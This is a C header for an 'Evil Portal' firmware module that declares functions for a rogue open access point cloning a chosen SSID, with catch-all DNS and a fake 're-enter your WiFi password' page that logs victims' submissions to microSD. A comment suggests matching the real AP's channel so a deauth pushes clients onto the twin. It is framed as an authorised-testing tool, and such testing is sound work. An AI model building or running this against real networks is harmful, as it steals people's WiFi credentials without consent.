#pragma once
#include <stdint.h>
#include <stdbool.h>

// ---------------------------------------------------------------------------
// Evil Portal — the ACTIVE side of the Evil-Twin panel.
//
// Stands up a rogue open AP cloning a chosen SSID, a catch-all DNS, and a
// captive-portal web server that presents a "re-enter your WiFi password" page
// and logs whatever a victim submits to the microSD (/EvilTwin/creds.txt).
// This is a defensive/authorised-testing tool — the same Evil Portal an
// ESP32-Marauder ships — for checking whether your own users fall for it. The
// first-boot disclaimer already gates the firmware to authorised use.
//
// Everything runs on the main/LVGL task: the WebServer + DNSServer are pumped
// from evil_portal_tick(), so there is no cross-task state to guard.
// ---------------------------------------------------------------------------

// Bring the twin up on `channel` (match the real AP's channel so a deauth on
// the genuine one nudges clients here). Returns false if SoftAP init fails.
bool evil_portal_start(const char *ssid, uint8_t channel);
void evil_portal_stop();
bool evil_portal_running();

// Pump DNS + HTTP. Call every UI tick while the panel is up.
void evil_portal_tick();

// One captured submission, kept in a small in-RAM ring for the live list.
struct EvilCred {
    char time[9];     // "HH:MM:SS" (or "?" with no RTC)
    char ip[16];      // victim's IP on the twin
    char secret[48];  // what they typed
};

// Live readouts for the UI.
int         evil_portal_client_count();  // stations currently associated
int         evil_portal_cred_count();    // submissions captured this session
const char *evil_portal_last_cred();     // last captured secret
const char *evil_portal_ssid();          // the SSID we're cloning

// Fills up to `max` recent captures, MOST-RECENT FIRST. Returns the count.
int         evil_portal_get_creds(EvilCred *out, int max);
